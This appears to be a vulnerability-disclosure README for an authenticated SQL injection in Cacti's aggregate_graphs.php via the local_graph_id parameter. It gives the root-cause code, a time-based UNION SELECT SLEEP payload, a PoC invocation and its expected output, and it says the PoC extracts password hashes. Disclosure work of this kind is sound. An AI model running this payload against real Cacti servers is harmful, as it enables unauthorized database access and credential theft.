# Authenticated SQL Injection in Cacti `aggregate_graphs.php` via `local_graph_id`

Disclosure-ready repository for an authenticated SQL injection affecting the Cacti `develop` branch / `1.3.0-dev` line.

> **Responsible disclosure note**
>
> The public PoC in this repository demonstrates the vulnerability by extracting password hashes from the database. It does not modify, delete, or corrupt any data. The PoC is intended solely for authorized security validation and coordinated disclosure purposes. No tokens, device secrets, or unrelated database contents are extracted.

## Summary

`aggregate_graphs.php`, when handling the graph-item save action, builds a SQL `WHERE` fragment by concatenating the raw, unvalidated `local_graph_id` request variable and passes it to `get_sequence()`. When `get_sequence()` receives a string-based group query, that string is used directly as the `WHERE` clause with no parameter binding.

An authenticated Cacti console user with aggregate-graph management access can inject SQL into a numeric `WHERE` context.

## Affected product

| Field | Value |
|---|---|
| Product | Cacti |
| Repository | <https://github.com/Cacti/cacti> |
| Affected version | `1.3.0-dev` / `develop` branch |
| Confirmed not affected | Stable `1.2.31` |
| Component | `aggregate_graphs.php` -> `form_save()` -> `save_component_item` branch |
| Sink | `lib/functions.php` -> `get_sequence()` |
| Source | `local_graph_id` request parameter via `grv()` / `get_request_var()` |
| CWE | CWE-89: SQL Injection |
| Suggested severity | High |
| Suggested CVSS v3.1 | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` |
| Disclosure contact | `info@cyber-sec.si` |
| Credit | CYBER-SEC d.o.o. |
| PoC author | CYBER-SEC |

## Root cause

The vulnerable path uses `grv('local_graph_id')`, which returns the raw request value, before an integer-filtered read is applied elsewhere.

```php
srv('sequence', get_sequence($sequence, 'sequence', 'graph_templates_item',
                             'local_graph_id=' . grv('local_graph_id')));
```

When the `sequence` parameter is omitted or empty, `get_sequence()` calculates the next sequence value and uses the supplied string group query as a raw `WHERE` clause.

## PoC

The PoC performs:

1. Login with supplied credentials.
2. CSRF token extraction.
3. Baseline timing request with `local_graph_id=0`.
4. Injected timing request with `local_graph_id=0 UNION SELECT SLEEP(2)`.
5. Boolean sanity check using time-delay true/false conditions.

```bash
python3 poc/exploit_cacti_sqli.py --base http://localhost:8080/cacti --username admin --password 'Admin12345!'
```

Expected output:

```text
[*] Step 1 - time-based confirmation
    baseline  local_graph_id=0                          : 0.02s
    injected  local_graph_id=0 UNION SELECT SLEEP(2.0)   : 2.02s
[+] CONFIRMED: response time is attacker-controlled via injected SQL

[*] Step 2 - boolean oracle sanity
    1=1 -> sleeps? True    1=2 -> sleeps? False
```
